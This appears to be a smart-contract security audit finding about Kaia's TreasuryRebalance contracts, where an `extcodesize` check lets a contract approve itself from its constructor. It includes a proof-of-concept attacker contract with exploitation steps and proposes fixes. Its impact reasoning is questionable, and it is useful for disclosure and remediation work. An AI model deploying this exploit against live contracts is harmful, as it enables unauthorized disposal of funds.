### Title
`extcodesize`-Based EOA/Contract Misclassification in `approve()` Bypasses Admin-Consent Gate for Treasury Fund Zeroing — (`contracts/testing/system_contracts/TreasuryRebalance.sol` and `TreasuryRebalanceV2.sol`)

---

### Summary

Both `TreasuryRebalance.sol` and `TreasuryRebalanceV2.sol` use `isContractAddr()`, which relies on `extcodesize`, to decide which authorization branch to execute inside `approve()`. Because `extcodesize` returns `0` for a contract that is currently executing its constructor, a malicious contract deployed at a registered retired/zeroed address can call `approve(address(this))` from its own constructor, be misclassified as an EOA, satisfy the trivial `require(msg.sender == _retiredAddress)` check, and inject itself as an approver — entirely bypassing the admin-list quorum gate. When combined with a `getState()` implementation that returns `req = 0`, the downstream `checkRetiredsApproved()` / `checkZeroedsApproved()` validation also passes, allowing `finalizeApproval()` to succeed and the core to execute the treasury rebalance without any legitimate admin consent.

---

### Finding Description

`isContractAddr` in both contracts is implemented identically:

```solidity
function isContractAddr(address _addr) public view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(_addr) }
    return size > 0;
}
``` [1](#0-0) [2](#0-1) 

The EVM only stores a contract's bytecode at the end of constructor execution. During the constructor, `extcodesize(address(this))` returns `0`, making the contract indistinguishable from an EOA.

`approve()` branches on this result:

```solidity
bool isContract = isContractAddr(_retiredAddress);
if (!isContract) {
    require(msg.sender == _retiredAddress, "retiredAddress is not the msg.sender");
    _updateApprover(_retiredAddress, msg.sender);
} else {
    (address[] memory adminList, ) = _getState(_retiredAddress);
    require(adminList.length != 0, "admin list cannot be empty");
    require(_validateAdmin(msg.sender, adminList), "msg.sender is not the admin");
    _updateApprover(_retiredAddress, msg.sender);
}
``` [3](#0-2) [4](#0-3) 

When a contract calls `approve(address(this))` from its constructor:
1. `isContractAddr(address(this))` → `false` (code size is 0)
2. EOA branch taken: `require(msg.sender == _retiredAddress)` → `true` (msg.sender IS the contract)
3. `_updateApprover` records the contract as its own approver

At `finalizeApproval()` time, `checkRetiredsApproved()` / `checkZeroedsApproved()` re-evaluates:

```solidity
bool isContract = isContractAddr(retired.retired); // now TRUE — code is deployed
if (isContract) {
    (address[] memory adminList, uint256 req) = _getState(retired.retired);
    require(retired.approvers.length >= req, "min required admins should approve");
    // ...
    require(validApprovals >= req, "min required admins should approve");
}
``` [5](#0-4) [6](#0-5) 

If the malicious contract's `getState()` returns `req = 0`, both `require` statements are trivially satisfied (`n >= 0` is always true), and `finalizeApproval()` advances the contract to `Status.Approved`. The core then executes the rebalance at the target block, zeroing the registered address's balance.

These contracts are not test-only artifacts. They have production Go bindings consumed by `blockchain/system/rebalance.go`, and the `kaiax/system` module explicitly executes treasury rebalance logic at KIP-103 and KIP-160 fork blocks. [7](#0-6) [8](#0-7) 

---

### Impact Explanation

The approval mechanism is the sole on-chain consent gate that prevents the Kaia Foundation (owner) from unilaterally zeroing a registered address's balance without that address's authorization. Bypassing it allows `finalizeApproval()` to succeed and the core to execute the rebalance — transferring or burning the registered address's KAIA balance — without any legitimate admin signature from the actual key-holders of that address. This is an unauthorized asset disposition affecting system-managed funds.

---

### Likelihood Explanation

The attack requires the malicious contract to be deployed at an address that the owner has already registered as a retired/zeroed address. This is achievable via CREATE2: an attacker who can predict a future registered address (or who controls an upgradeable proxy at a registered address) can deploy a malicious constructor-approver before or in place of the legitimate contract. The owner's registration of the address is a normal operational step, not a malicious one. The attacker does not need owner collusion — only the ability to deploy code to the registered address.

---

### Recommendation

Replace the `extcodesize`-based check with an `tx.origin` comparison or a stored flag set at registration time:

**Option 1 — `tx.origin` guard (mirrors the upstream fix):**
```solidity
function approve(address _retiredAddress) public onlyAtStatus(Status.Registered) {
    require(zeroedExists(_retiredAddress), "...");
    bool isContract = isContractAddr(_retiredAddress);
    if (!isContract) {
        require(msg.sender == _retiredAddress && msg.sender == tx.origin,
                "retiredAddress is not the msg.sender or caller is a contract");
        _updateApprover(_retiredAddress, msg.sender);
    } else { ... }
}
```

**Option 2 — Record contract/EOA type at registration time** (when the address is already deployed and `extcodesize` is reliable), and store the classification in the `Retired`/`Zeroed` struct. Use the stored flag in `approve()` instead of re-querying `extcodesize` at call time.

---

### Proof of Concept

```solidity
// Attacker deploys this contract to an address already registered as retired/zeroed.
// Uses CREATE2 so the address is predictable before deployment.
contract MaliciousRetired {
    constructor(address treasuryRebalance) {
        // During constructor: extcodesize(address(this)) == 0
        // isContractAddr returns false → EOA branch taken
        // msg.sender == address(this) → require passes
        ITreasuryRebalance(treasuryRebalance).approve(address(this));
    }

    // Returns req=0 so checkRetiredsApproved() passes at finalization
    function getState() external view returns (address[] memory, uint256) {
        return (new address[](0), 0);
    }
}
```

Step-by-step:
1. Owner calls `registerRetired(predictedAddress)` (normal operational step).
2. Owner calls `finalizeRegistration()` → status = `Registered`.
3. Attacker deploys `MaliciousRetired(treasuryRebalanceAddr)` to `predictedAddress` via CREATE2.
4. Constructor calls `approve(address(this))` → EOA branch → approver recorded.
5. Owner calls `finalizeApproval()` → `checkRetiredsApproved()` calls `getState()` → `req = 0` → both `require` pass → status = `Approved`.
6. Core executes rebalance at `rebalanceBlockNumber`, zeroing `predictedAddress`'s balance without any legitimate admin consent. [9](#0-8) [10](#0-9) [1](#0-0)
